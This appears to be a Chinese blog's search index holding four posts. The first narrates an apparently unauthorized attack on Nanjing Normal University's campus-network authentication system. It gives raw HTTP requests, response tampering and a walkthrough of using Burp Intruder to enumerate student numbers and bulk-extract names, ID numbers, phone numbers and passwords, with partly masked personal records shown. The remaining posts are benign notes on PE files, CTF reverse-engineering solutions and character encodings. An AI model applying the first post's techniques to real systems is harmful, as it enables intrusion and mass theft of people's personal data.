<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[一次对南师大的校园网认证系统的逻辑漏洞测试]]></title>
    <url>%2F2017%2F11%2Fnnuwifi.html</url>
    <content type="text"><![CDATA[记录了最近在南师大对其校园网逻辑漏洞测试中的一些有趣曲折的点 前言最近常来南京师范大学(随园校区)这边玩，来感受一下研究生们的学霸学习氛围~ 作为一名职业网民，打开电脑的第一件事当然就是来连接周围的WiFi啦。南师大的WiFi是校园网全校覆盖的，在学校周边也是可以连接到校园WiFi的。当然连上WiFi没有这么简单，进行认证后才可以开开心心上网，接下来就分享一下最近的校园网认证系统的探索过程。 校园网概览这一块记录了国光本人平时做信息收集的思路和方法，欢迎志同道合的小伙伴一起交流信息收集的相关技术~ SSID首先校园网有2种SSID，分别是:12mnu_stu :学生专用mnu_sta :老师专用 上网认证1http://223.x.xx.xxx/eportal/index.jsp?wlanuserip=30d5b38028f3479d2be5113c417dc933&amp;wlanacname=63cbbfe1990b214e&amp;ssid=&amp;nasip=428fd27b3f03bb3b7072e332292b3066&amp;snmpagentip=&amp;mac=82bff3ae27d78ed0425049c67e9564a3&amp;t=wireless-v2&amp;url=ddcf351fa2345782b4adc5cf7326a4a76bcbe2460ba43a33e495990859bb0d4500d7ff5d3fbd60c4&amp;apmac=&amp;nasid=63cbbfe1990b214e&amp;vid=57a7181b22993f48&amp;port=1dcf032f51eb16cf&amp;nasportid=f5eb983692924fa26e6431fe9df4835fc5f153c43b10c5dbcca27b7d788c193aa021d58a893d1a20 ip223.x.x.x: 江苏省南京市 教育网 ~~ 手机用流量访问这个URL认证界面无页面显示 通知公告有效信息提取教师和学生使用不同的SSID来使用校园网进行上网,接着提供了一个宿舍网络服务指南。 《宿舍网络服务指南》1&lt;a href="http://net.njnu.edu.cn/Page/Show/106"&gt;《宿舍网络服务指南》&lt;/a&gt; 点击这个超链接闪了一下，然后页面刷新了一下还是这个上网认证界面。然鹅这个是外网的地址，使用手机流量是可以正常访问的。有效信息提取最后面的邮箱地址:或邮至60167@njnu.edu.cn 后期可能会用这个邮箱，先记下来再说。 校园网自助服务系统这个校园网自助服务系统在上网认证系统登录界面的右上角:1http://192.168.11.98:8080/selfservice/ 有效信息提取 登录上面的自助注册 版权所有 ©2000-2016 锐捷网络自助注册有效信息提取 首先是最直接的信息，没想到这个页面直接缓存了一个学姐的信息~ 这个可能就是传说中的页面缓存漏洞吧 1234性别: 女证件号码: 21140xxx电话号码: 15651xxxxx 住址: 江苏省南京市 注册和审核结果查询,理论上来说可以再这个自助服务系统注册然后查看审核结果进度 电脑分配的ip查看电脑分配的ip地址，观察下网关和ip情况:可以看到外网不通，内网的网关ip地址是:172.24.0.1 进阶信息收集nmap一般来说校园网是一个大的内网，这个时候拿出masscan和nmap进行全方位扫描下肯定会发现很多资产列表的。这里有小伙伴要问了：为什么进行校园网认证要收集这些资产呢？下面说下我曾经内网收集我的母校的情况: 在学校内搭建一些应用的服务器有的是不需要进行统一上网认证的，可能是进行了区域的限定，在那个区域的服务器有免认证的特权，所以信息收集的话 找到这些服务器是 关键要素 ，然后随便利用写历史上爆发的漏洞，比如：ms17010 等等 直接拿到服务器权限，搭建有Web应用的服务器 可以尝试先拿到webshell，然后提权进服务器…… 这里大家都是知道的，不具体谈这个。 拿到服务器后可以尝试搭建VPN，因为内网是相通的，这个时候利用这个VPN就可以免认证上网了……（以上纯属是国光的一厢情愿） nmap信息收集结果分别使用如下格式，对3个网段进行扫描12nmap -sV -T4 -O -F --version-light 172.24.0.1/24nmap -sV -T4 -O -F --version-light 192.168.11.1/24 结果没有任何结果，我果然是一厢情愿~ 南师大内网很奇葩，在内网也必须得走上网认证才可以，无法直接去ping通，nmap扫描期间都会转向开了的80和8081端口的服务器。结论端口扫描 – 扑街 思路转换直接暴力入侵服务器然后搭建VPN的方法落空，现在只能从这个校园网认证系统进行研究。方向： 是否有后台管理系统 能否使用其他研究生学号暴力破解密码 是否存在逻辑漏洞 上网认证系统 or 校园网自助服务系统 Jboss 搭建的应用是否存在Java反序列化漏洞 ©2000-2016 锐捷网络 历史上是否爆出相关的漏洞 60167@njnu.edu.cn 这个学习校园网管理员的邮箱 是否可以社工? 这里我选择了 主要测试 校园网自助服务器系统，因为这里是192开头的内网地址，难度上肯定要低于223开头的外网系统的应用。测试方法 这里测试的是 逻辑漏洞，暴力破解的话 ，通过注册页面可以看出这里是 个人自定义设置密码的，不存在默认密码的可能，密码的复杂度就会很高，所以这里不到万不得已，绝对不使用暴力破解。 尝试逻辑漏洞绕过验证先注册完善一个用户信息:然后查询下审核结果:下面是审核查询的结果:可以看到状态是未审核，尝试在查询审核结果的登录界面进行抓包，修改其返回包:图片看不清的下面提供具体的HTTP数据包:123456789101112131415161718192021222324252627282930313233343536POST /selfservice/module/userself/web/userself_reg_ajax.jsf?methodName=regUserinfoBean.findUserinfo HTTP/1.1Host: 192.168.11.98:8080Content-Length: 13Accept: application/json, text/javascript, */*; q=0.01Origin: http://192.168.11.98:8080X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://192.168.11.98:8080/selfservice/module/userself/web/reguserinfo_guest.jsfAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=EE81927464803C8FA092134E85A89DEFConnection: closekey=gg:123456返回包如下HTTP/1.1 200 OKServer: Apache-Coyote/1.1X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1P3P: CP=&quot;CAO PSA OUR&quot;Pragma: no-cacheCache-Control: no-cacheExpires: Thu, 01 Jan 1970 00:00:00 GMTPragma: no-cacheCache-Control: no-cacheContent-Type: text/html;charset=gbkContent-Length: 753Date: Thu, 16 Nov 2017 08:15:19 GMTConnection: close&#123;&quot;regUserinfoUuid&quot;:&quot;40288be25b65ab9e015fc3dff1b56164&quot;,&quot;userId&quot;:&quot;gg&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;userType&quot;:2,&quot;judgeType&quot;:1,&quot;createTime&quot;:&quot;2017-11-16 16:09:14&quot;,&quot;lastUpdateTime&quot;:&quot;2017-11-16 16:09:14&quot;,&quot;stateFlag&quot;:2,&quot;userName&quot;:&quot;\u56fd\u5149&quot;,&quot;sex&quot;:2,&quot;certificateType&quot;:2,&quot;certificateNo&quot;:&quot;2114xxxx&quot;,&quot;address&quot;:&quot;\u6c5f\u82cf\u7701\u5357\u4eac\u5e02&quot;,&quot;telephone&quot;:&quot;1565xxxxxxx&quot;,&quot;nasPort&quot;:0,&quot;firstBind&quot;:0,&quot;userRegInfo&quot;:&quot;\u6ca1\u6709\u7f51\u548c\u4e00\u6761\u54b8\u9c7c\u6709\u4ec0\u4e48\u533a\u522b~~&quot;,&quot;nextBillingTime&quot;:&quot;1980-1-1 0:00:00&quot;,&quot;isPeriodStop&quot;:2,&quot;periodTimeCumut&quot;:0,&quot;periodTrafficCumut&quot;:0.000000,&quot;periodForeUpCumut&quot;:0.000000,&quot;periodForeDownCumut&quot;:0.000000,&quot;periodInlandUpCumut&quot;:0.000000,&quot;periodInlandDownCumut&quot;:0.000000,&quot;periodNtdFlowSumCumut&quot;:0.000000&#125; 这里将这个judgeType:1修改为:judgeType:0然后再发包,结果如下:审核通过了！整理本次注册使用的信息如下123456用户名:gg证件号:21140xxx密码:123456密码组合:用户名:gg 密码:123456证件号:21140xxx 密码:123456 但是尝试这些密码组合最后都失败了，尽管我们已经篡改了返回包临时欺骗了系统，系统显示注册信息审核通过了，但是实际上，我们还是没有欺骗上网认证系统，上网依然需要认证。 结论篡改返回包 – 失败 尝试密码找回漏洞密码找回直接在前端界面处并没有找到，由于前段时间看过补天排名第一的大神总结的 密码找回漏洞的10种姿势，所以这里得想办法找到密码找回的URL。在上网认证界面处刷新一下，Burp抓包，然后看返回包，可以在返回包里面直接看到网站的部分源代码。在里面可以找到密码找回的URL处~具体的关键代码如下:1234567//忘记密码 if(pageInfo.isForgetPassword&amp;&amp;pageInfo.isForgetPassword=='true')&#123; $("#forgetPassword").attr("href",pageInfo.selfUrl+"/module/userself/web/password_retrieve.jsf?eportal=true"); $("#forgetPasswordDiv").show(); &#125;else&#123; $("#forgetPasswordDiv").hide(); &#125; 看到忘记密码熟悉的URL，好像在自助服务这里有看到过，于是乎尝试在自助服务的后面+ 这串URL，成功获取到了找回密码界面。到这里开始有些兴奋了，最近学的密码重置找回漏洞终于要拍上用场了:-D 赶紧输入 一个学姐的学号 点击下一步~~ ，结果大吃一惊找回密码的界面这里是空的，难道代码被注释了嘛？？于是审查元素看看~果然发现了被注释的代码，除了使用了1&lt;!--注释--&gt; 这种格式的代码来注释，还使用了1&lt;div style="display:none"&gt;&lt;/div&gt; 来隐藏了界面的布局最后恢复了完整的布局是酱紫的:但是点击发送的时候，还是提示 输入的手机号码是空的。代码里面已经还原了所有隐藏的组件了还是没有找到手机号码的输入框~~ 猜测可能是管理员删了这一段代码……心里还是有点不甘，感觉卡在这里 岂不是很尴尬，于是尝试自己手动添加input输入框，然后来猜测id值，这里的id我尝试了很多，在一个js里面找到了id的正确值：最后成功添加如下输入框:1&lt;input maxlength="32" class="text1" id="phonespans" style="color: rgb(153, 153, 153);" type="text"&gt; 然后再输入这个学号绑定到的手机号，在隐藏域中可以找到:有了账号，有了输入框，赶紧输入进去点击发送按钮看看~结果！提示短信发送失败……终于知道管理员为什么要注释删除这段代码了，因为这个密码找回的功能本来就用不了~ 可能是管理员服务器没有配置短信发送和邮件发送~~ 吐血ing结论密码找回 – GG 意外测试–学生敏感数据泄露在密码找会这个页面，输入用学号,意外发现了惊喜~然后查看下返回包：具体返回包关键内容如下:12345678910111213141516171819202122232425262728293031323334353637&#123; "userinfoUuid":"818181824c971068014cb6bf35da1f49", "userId":"2014xxx", "businessType":3, "password":"ShYfZxxxxxxxx", "userType":1, "userFrom":8, "userTemplateUuid":"40288bf223382853012347bd769c15ca","accountInfoUuid":"818181824c971068014cb6bf35c91f47","webSelfhelpPerUuid":"4028b62f3739e69701373a015828003a", "policyInfoUuid":"40288bf222c5d29a0122c6a8e9370022","userPackageUuid":"1155073Ef190Ef4CC9fBBD3fA31401B4", "createTime":"2015-4-14 15:05:26", "lastUpdateTime":"2016-5-9 1:19:08", "createManagerId":"system", "stateFlag":2, "userName":"\u80e1\u73a5", "certificateType":1, "certificateNo":"620321199xxxxxxxxx", "address":"\u7d2b\u91d1\u6821\u533a21\u53f7104", "mobile":"1565xxxxxxx", "nasPort":0, "freeAuthen":1, "firstBind":0, "periodStartTime":"2016-5-22 2:00:15", "nextBillingTime":"2016-6-21 0:00:00", "isPeriodStop":2, "policyFrom":2, "field3":"\u662f", "field4":"\u5728\u6821\u5168\u65e5\u5236\u7edf\u62db\u672c\u79d1\u751f", "groupinfoId":"\u672c\u79d1\u751f", "campusGroupinfoUuid":"818181814bf25e97014c4fb7ab207597", "campusPolicyFrom":2, "campusTemplateUuid":"40288bf223382853012347bd769c15ca", "campusPackageUuid":"1155073Ef190Ef4CC9fBBD3fA31401B4", "campusWebSelfhelpPerUuid":"4028b621133e18c90113300000000001", "haveOperatorsInfo":false, "numOfOperatorsBindInfo":0, "canAcctDetail":false&#125; 里面的汉字数据全部是使用了unicode转换了，重新使用unicode码转汉字即可看到原来的内容。然后把key=2014xxxx换成key=2015xxxx后，发现返回的数据值也变了尝试批量这里借助这个POST的URL，穷举key=2014xxxx的值可以达到批量提取数据的效果。说到批量可以使用Python来编写脚本，但是我个人觉得不要重复造轮子，BurpSuite本身就可以完全实现脱裤效果，下面是具体的过程演示。 数据发送到穷举模块这一步大家一定很熟悉，右键 数据包 发送 穷举模块，准备进行爆破然后Clear $清除所有的变量，标记key=2014xxx后面的字段，然后Add $。字典这里使用Burp自带的数字字典，从20140110到20140610 500个数据，这里粗略尝试看下效果怎么样。 从返回包提取关键数据在Intruder模块中转到Options，然后找到Grep-Extract，关于这个功能官方这里给的介绍如下:1这些设置可以从返回结果的数据包中提取筛选处有用的信息 好！这正是我们想要的功能，然后Add添加想要的数据，然后直接鼠标标记出来点击ok，这时候,Burp就智能的匹配确认了所要提取的数据信息，这里我添加了userId、userName、certicateNo、mobile分别对应用户id、用户名、身份证号、手机号。设置好这些直接点击Start attack开始攻击。 然后坐等结果列表了。成功拿到结果： 总结没错，最后我依然没有绕过上网认证系统去上网，这篇文章纯属是自己误打误撞的产物，不说了，这个月的流量又要超标了。]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>渗透测试</tag>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PE文件格式]]></title>
    <url>%2F2017%2F11%2Fpe.html</url>
    <content type="text"><![CDATA[PW整理学习的PE文件格式，逆向学习笔记记录~ 介绍PE文件是Windows操作系统下使用的可执行文件格式。PE文件是指32位的可执行文件，也称为PE32。64位的可执行文件成为PE+或者PE32+,是PE(PE32)文件的一种扩展形式(不是PE64)。 PE文件格式PE文件种类 种类 主扩展名 种类 主扩展名 可执行系列 EXE、SCR 驱动程序系列 SYS、VXD 库系类 DLL、OCX、CPL、DRV 对象文件系列 OBJ 基本结构从DOS头(DOS header)到节区头是PE头部分，其下的节区合称PE体。文件中使用偏移(offset),内存中使用VA(VirtualAddress，虚拟地址)来表示位置。文件加载到内存时，情况就会发生变化(节区的大小、位置等)。文件的内容一般可分为代码(.text)、数据(.data)、资源(.rsrc)节，分别保存。 12345以上是是逆向工程核心原理PE其他的RE题待续。。。文件格式的部分笔记，以前就有写过关于PE文件格式的笔记，当时只是简单地记了一下，现在重新拾起来。待续。。。下面是实验吧几道简单的RE题的解题思路，实验吧 CFG to C题目如下我们先从A)分析开始：我们可以看到1234int modulo(int a, int b) &#123; return b % a; &#125; 我们从中可以看到关键点是：return b % a ;看到之后我们就可以在左侧找对应的选项：4)-&gt;A,因为其中有idiv 汇编指令。接下来,我们来分析B),1234567int loop(int a) &#123; While (a &gt;= 0) &#123; a--; &#125; return a; &#125; 看到这个代码，我们首先能获得的信息：1231.While循环2.a&gt;=0 比较判断3. a-- 接下来说一下思路：既然是While循环那么对应的汇编代码至少要体现循环，我们发现只有1)，3)是符合条件的。继续分析a&gt;=0 比较判断这个信息，发现1)3)1) cmp(compare)指令进行比较两个操作数的大小 JNS（结果为正则转移），3) cmp(compare)指令进行比较两个操作数的大小 jmp是无条件跳转，jl应该是jmp low 是条件跳转中的小于就跳转 就写到这吧，能看懂就懂，不懂的在查资料。那么选项就出来:1)-&gt;B 3)-&gt;D Byte Code题目解压出来是一个Authenticator.class文件一开始，我是懵圈的，作为学Java的竟然不认识.class文件很是羞愧的，后来在下面的提示下有了思路是Java反编译，下一个工具jd-gui就解决问题. 反编译代码：12345678910111213141516171819202122232425262728293031import java.io.Console;import java.io.PrintStream;class Authenticator&#123; public static char[] key; public static void main(String[] paramArrayOfString) &#123; key = new char[10]; key[0] = 'A'; key[1] = 'o'; key[2] = 'J'; key[3] = 'k'; key[4] = 'V'; key[5] = 'h'; key[6] = 'L'; key[7] = 'w'; key[8] = 'U'; key[9] = 'R'; Console localConsole = System.console(); String str = ""; while (!str.equals("ThisIsth3mag1calString4458")) &#123; str = localConsole.readLine("Enter password:", new Object[0]); &#125; for (int i = 0; i &lt; key.length; i++) &#123; System.out.print(key[i]); &#125; System.out.println(""); &#125;&#125; 运行结果：改过之后的代码：12345678910111213141516171819202122232425262728293031import java.io.Console;import java.io.PrintStream;class Authenticator&#123; public static char[] key; public static void main(String[] paramArrayOfString) &#123; key = new char[10]; key[0] = 'A'; key[1] = 'o'; key[2] = 'J'; key[3] = 'k'; key[4] = 'V'; key[5] = 'h'; key[6] = 'L'; key[7] = 'w'; key[8] = 'U'; key[9] = 'R'; Console localConsole = System.console(); String str = "ThisIsth3mag1calString4458"; while (!str.equals("ThisIsth3mag1calString4458")) &#123; str = localConsole.readLine("Enter password:", new Object[0]); &#125; for (int i = 0; i &lt; key.length; i++) &#123; System.out.print(key[i]); &#125; System.out.println(""); &#125;&#125; 运行结果，在这就不贴出来。 bitwise解压出来是两个文件bitwise.java and bitwise.py随便打开一个文件(我打开的是bitwise.java),代码如下：12345678910111213141516171819202122232425262728293031import java.util.*;public class Bit &#123; public static void main(String[] args) &#123; System.out.print("Enter Password: "); Scanner s = new Scanner(System.in); String user_key = s.next(); if (user_key.length() != 10) &#123; System.out.println("Wrong"); return; &#125; char[] verify_arr = &#123;193, 35, 9, 33, 1, 9, 3, 33, 9, 225&#125;; ArrayList&lt;Character&gt; user_arr = new ArrayList&lt;Character&gt;(); char[] user_submitted_arr = user_key.toCharArray(); for (char ch : user_submitted_arr) &#123; user_arr.add((char)((((ch &lt;&lt; 5) | (ch &gt;&gt; 3)) ^ 111) &amp; 255)); &#125; int i; for(i = 0; i &lt; 10; i++) &#123; if (!user_arr.get(i).equals((char)verify_arr[i])) &#123; System.out.println("Wrong"); return; &#125; &#125; System.out.println("Success"); &#125;&#125; 思路：输入10组数字通过for (char ch : user_submitted_arr) { user_arr.add((char)((((ch &lt;&lt; 5) | (ch &gt;&gt; 3)) ^ 111) &amp; 255)); }代码转成asii码与char[] verify_arr = {193, 35, 9, 33, 1, 9, 3, 33, 9, 225}(char)verify_arr[i])的ascii码对比。 一开始我被char类型的，所困惑，后来问一个学长，他的思路是两组都是int数组，只不过是两个数组都加了char类型转换，既然这样，那我们直接通过int类型来解题(暴力破解)。 解题代码：123456789 #!/usr/bin/env python# -*- coding:utf-8 -*-zidian =['&#123;','&#125;','[',']','\'','|',';',':','"',',','&lt;','&gt;','.','/','?','0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','!','!','@','#','$','^','&amp;','*','(',')','-','+']jiami = (int)(input("请输入被加密后的密文:"))for i in range(0,(len(zidian)-1)): g = ( (((ord(zidian[i]) &lt;&lt; 5) | (ord(zidian[i]) &gt;&gt; 3)) ^ 111) &amp; 255 ) if (g == jiami): print("密码原文是") print (zidian[i]) 运行结果： 总结12Knowing is not enough; we must apply. Willing is not enough; we must do.”* **（仅仅知道还不够，我们必须付诸实践。仅有意愿还不够，我们必须付诸行动。）—— Johann Wolfgang von Goethe 需要学习的地方还很多。努力。。]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>sky</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码的故事]]></title>
    <url>%2F2017%2F11%2Fascii.html</url>
    <content type="text"><![CDATA[编码的故事，科普了一些ASCII码，Unicode编码，GBK编码等由来的历史。 计算机用来组合字节很久很久以前，有一群人，他们决定用8个可以开合的晶体管来组合成不同的状态，以表示世界上的万物。他们看到8个开关状态是好的，于是他们把这称为”字节“。 再后来，他们又做了一些可以处理这些字节的机器，机器开动了，可以用字节来组合出很多状态，状态开始变来变去。他们看到这样是好的，于是它们就这机器称为”计算机”。 控制码是用于特殊用途的字节开始计算机只在美国用。八位的字节一共可以组合出256(2的8次方)种不同的状态。 他们把其中的编号从0开始的32种状态分别规定了特殊的用途，一但终端、打印机遇上约定好的这些字节被传过来时，就要做一些约定的动作。遇上00x10, 终端就换行，遇上0x07, 终端就向人们嘟嘟叫，例好遇上0x1b, 打印机就打印反白的字，或者终端就用彩色显示字母。他们看到这样很好，于是就把这些0x20以下的字节状态称为”控制码“。 ASCII码的由来 他们又把所有的空格、标点符号、数字、大小写字母分别用连续的字节状态表示，一直编到了第127号，这样计算机就可以用不同字节来存储英语的文字了。大家看到这样，都感觉很好，于是大家都把这个方案叫做 ANSI 的”Ascii“编码（American Standard Code for Information Interchange，美国信息互换标准代码）。当时世界上所有的计算机都用同样的ASCII方案来保存英文文字。 笔记123ANSI == AsciiASCII = American Standard Code for Information Interchange 美国 标准 代码 信息 互换 扩展字符集的由来后来，就像建造巴比伦塔一样，世界各地的都开始使用计算机，但是很多国家用的不是英文，他们的字母里有许多是ASCII里没有的，为了可以在计算机保存他们的文字，他们决定采用127号之后的空位来表示这些新的字母、符号，还加入了很多画表格时需要用下到的横线、竖线、交叉等形状，一直把序号编到了最后一个状态255。从128到255这一页的字符集被称&quot;扩展字符集&quot;。从此之后，贪婪的人类再没有新的状态可以用了，美帝国主义可能没有想到还有第三世界国家的人们也希望可以用到计算机吧！ GB2312编码等中国人们得到计算机时，已经没有可以利用的字节状态来表示汉字，况且有6000多个常用汉字需要保存呢。但是这难不倒智慧的中国人民，我们不客气地把那些127号之后的奇异符号们直接取消掉, 规定：一个小于127的字符的意义与原来相同，但两个大于127的字符连在一起时，就表示一个汉字，前面的一个字节（他称之为高字节）从0xA1用到0xF7，后面一个字节（低字节）从0xA1到0xFE，这样我们就可以组合出大约7000多个简体汉字了。在这些编码里，我们还把数学符号、罗马希腊的字母、日文的假名们都编进去了，连在 ASCII 里本来就有的数字、标点、字母都统统重新编了两个字节长的编码，这就是常说的”全角”字符，而原来在127号以下的那些就叫&quot;半角&quot;字符了。 中国人民看到这样很不错，于是就把这种汉字方案叫做 &quot;GB2312&quot;。GB2312 是对 ASCII 的中文扩展。 GBK编码但是中国的汉字太多了，我们很快就就发现有许多人的人名没有办法在这里打出来，特别是某些很会麻烦别人的国家领导人。于是我们不得不继续把 GB2312 没有用到的码位找出来老实不客气地用上。 后来还是不够用，于是干脆不再要求低字节一定是127号之后的内码，只要第一个字节是大于127就固定表示这是一个汉字的开始，不管后面跟的是不是扩展字符集里的内容。结果扩展之后的编码方案被称为 GBK 标准，GBK 包括了 GB2312 的所有内容，同时又增加了近20000个新的汉字（包括繁体字）和符号。 GB18030编码后来少数民族也要用电脑了，于是我们再扩展，又加了几千个新的少数民族的字，GBK 扩成了 GB18030。从此之后，中华民族的文化就可以在计算机时代中传承了。 Unicode编码各个国家使用各个国家自己的编码有没有很繁琐？于是大家很期盼有一种统一的编码形式出现。Unicode编码出现了。Unicode使用的通用的字符集叫做UCS。这个字符集就是一个大的字符空间，每个语种都在这个字符空间内划分一段领域。现在应用的UCS是UCS-2，意思就是不管是英文中文，统一使用两个字节（16bit）来进行字符分配。UCS-2字符集可以表示216（即65536）个字符。已经基本满足世界上所有语言了。如果不够怎么办？已经有预定方案UCS-4（用4个字节表示一个字符。 UTF-16UTFXX是Unicode的具体实现方式UTF-16是Unicode最基本的实现。Unicode使用16bit表示一个字符，UTF-16就是直接将字符集的映射搬过来而已。 UTF-8本来这样就已经很美好了，但是美国人又不干了。凭什么每个英语字符要占用2个字节？凭什么占用了我们的带宽和CPU？于是一帮英语体系的外国人讨论出了UTF-8这种字符编码。 UTF-8这种编码是怎么回事呢？英文字符，和ASCII码一样，占用一个字节其他语种，每种语种分配一个模板，这个模板有16bit，24bit，甚至还有32bit的。各个语种根据这个模板，将自己的语言转化成模板要求的编码（UTF-8） 这里演示一个中文字“汉”1234比如中文分到的模板是1110xxxx 10yyyyyy 10zzzzzz汉字的Unicode编码是0x6C49，二进制是0110 1100 0100 1001将这个二进制按照模板的x，y，z顺序插入得到11100110 10110001 10001001 就是E6 B1 89 好了…大家看出这个对中文有什么不好的吗？原先一个中文使用UTF-16只需要两个字节，但是使用UTF-8却需要3个字节，如果一个网页有1w个中文字，那么我们就需要多传输1w个字节，带宽啊！！ 现在就明白了，为什么国内一些网站，比如sina，它的编码规则是使用GBK了吧！]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>国光</tag>
        <tag>密码学</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[国光的第一个逆向题]]></title>
    <url>%2F2017%2F11%2Fbitwise.html</url>
    <content type="text"><![CDATA[PW给的一道CTF题，由于实验吧把这一道题目归类于逆向，那么这个就是我国光做出来的第一道”逆向”题目啦 题目You see the doors to the loading bay of the hangar, but they are locked. However, you are able to extract the password verification program from the control panel… Can you find the password to gain access to the loading bay?翻译1你可以看到机库的装货门，但是它们被锁上了。但是，您可以从控制面板中提取密码验证程序…你能找到进入装货港的密码吗？ 附件bitwise.py12345678910111213141516171819202122#!/usr/bin/env pythonuser_submitted = raw_input("Enter Password: ")if len(user_submitted) != 10: print "Wrong" exit()verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]user_arr = []for char in user_submitted: # '&lt;&lt;' is left bit shift # '&gt;&gt;' is right bit shift # '|' is bit-wise or # '^' is bit-wise xor # '&amp;' is bit-wise and user_arr.append( (((ord(char) &lt;&lt; 5) | (ord(char) &gt;&gt; 3)) ^ 111) &amp; 255 )if (user_arr == verify_arr): print "Success"else: print "Wrong" bitwise.java123456789101112131415161718192021222324252627282930313233import java.util.*;public class Main &#123; public static void main(String[] args) &#123; System.out.print("Enter Password: "); Scanner s = new Scanner(System.in); String user_key = s.next(); if (user_key.length() == 10) &#123; System.out.println("Wrong"); return; &#125; char[] verify_arr = &#123;193, 35, 9, 33, 1, 9, 3, 33, 9, 225&#125;; ArrayList&lt;Character&gt; user_arr = new ArrayList&lt;Character&gt;(); char[] user_submitted_arr = user_key.toCharArray(); System.out.println(user_submitted_arr.length); for (char ch : user_submitted_arr) &#123; user_arr.add((char)((((ch &lt;&lt; 5) | (ch &gt;&gt; 3)) ^ 111) &amp; 255)); System.out.println(user_arr); &#125; int i; for(i = 0; i &lt; 10; i++) &#123; if (!user_arr.get(i).equals((char)verify_arr[i])) &#123; System.out.println("Wrong"); return; &#125; &#125; System.out.println("Success"); &#125;&#125; 思路由于本人Java水平一般般这里就不去解读Java代码了,所以来直接阅读Python代码。 简单分析代码这里我在源代码基础上 直接加上注释吧，方便阅读12345678910111213141516171819202122232425262728#!/usr/bin/env pythonuser_submitted = raw_input("Enter Password: ") # 提示输入密码并记录此刻用户的输入值 用户输入的密码值 存入 user_submitted 变量中if len(user_submitted) != 10: print "Wrong" exit()# 如果用户输入的密码长度不是10位 输出 Wrong 并结束程序verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]# 定义一个数组 verify_arr 用来验证作用user_arr = []# 定义并初始化一个 user_arr 数组变量for char in user_submitted:# 循环提取user_submitted变量中的字符 # '&lt;&lt;' is left bit shift # '&gt;&gt;' is right bit shift # '|' is bit-wise or # '^' is bit-wise xor # '&amp;' is bit-wise and user_arr.append( (((ord(char) &lt;&lt; 5) | (ord(char) &gt;&gt; 3)) ^ 111) &amp; 255 )# 对这个字符进行 加密处理 这里是核心加密代码，加密后的代码放入user_arr这个变量里面if (user_arr == verify_arr):# 拿user_arr与验证数组verify_arr 来做判断 输入正确或者错误 print "Success"else: print "Wrong" 突破这一题目的代码很容易理解，从代码中可以看出这一题想让我们写出正确的密码，flag 就是密码值。一次性还原出10位数密码有点难度，这里我的思路是1位1位的去还原。 POC代码第一版第一版代码比较繁琐，手工输入字典，然后手工一位一位的来破解，效率不是很高，虽然最后也可以解出密码来。123456789#!/usr/bin/env python# -*- coding:utf-8 -*-zidian =['&#123;','&#125;','[',']','\'','|',';',':','"',',','&lt;','&gt;','.','/','?','0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','!','!','@','#','$','^','&amp;','*','(',')','-','+']jiami = (int)(input("请输入被加密后的密文:"))for i in range(0,(len(zidian)-1)): g = ( (((ord(zidian[i]) &lt;&lt; 5) | (ord(zidian[i]) &gt;&gt; 3)) ^ 111) &amp; 255 ) if (g == jiami): print("密码原文是") print (zidian[i]) 效果演示 POC代码第二版我们每次破解还原1位密码还得重新来运行这个脚本，现在思考能不能一直循环的来运行呢？1234567891011121314#!/usr/bin/env python# -*- coding:utf-8 -*-zidian =['&#123;','&#125;','[',']','\'','|',';',':','"',',','&lt;','&gt;','.','/','?','0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','!','!','@','#','$','^','&amp;','*','(',')','-','+']while(1): jiami = (int)(input("请输入被加密后的密文:")) for i in range(0,(len(zidian)-1)): g = ( (((ord(zidian[i]) &lt;&lt; 5) | (ord(zidian[i]) &gt;&gt; 3)) ^ 111) &amp; 255 ) if (g == jiami): print("密码原文是") print(zidian[i]) panduan = raw_input("是否继续输入？[Y/N]") if(panduan == 'N' or panduan =='n'): print("Bye Bye~") exit() 效果演示可以看到效率提高了很多，尤其是在密码位数比较多的情况下就会显示出差距了。 POC代码第三版这个脚本用起来还不够方便，因为是一位一位去破解的，而且最后为了拿到密码值，我们还得一位一位的拼接起来，现在思考能不能最后把密码值完全拼接好再print出来呢？123456789101112131415161718#!/usr/bin/env python# -*- coding:utf-8 -*-zidian =['&#123;','&#125;','[',']','\'','|',';',':','"',',','&lt;','&gt;','.','/','?','0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','!','!','@','#','$','^','&amp;','*','(',')','-','+']jieguo = []while(1): jiami = (int)(input("请输入被加密后的密文:")) for i in range(0,(len(zidian)-1)): g = ( (((ord(zidian[i]) &lt;&lt; 5) | (ord(zidian[i]) &gt;&gt; 3)) ^ 111) &amp; 255 ) if (g == jiami): print("密码原文是") print(zidian[i]) 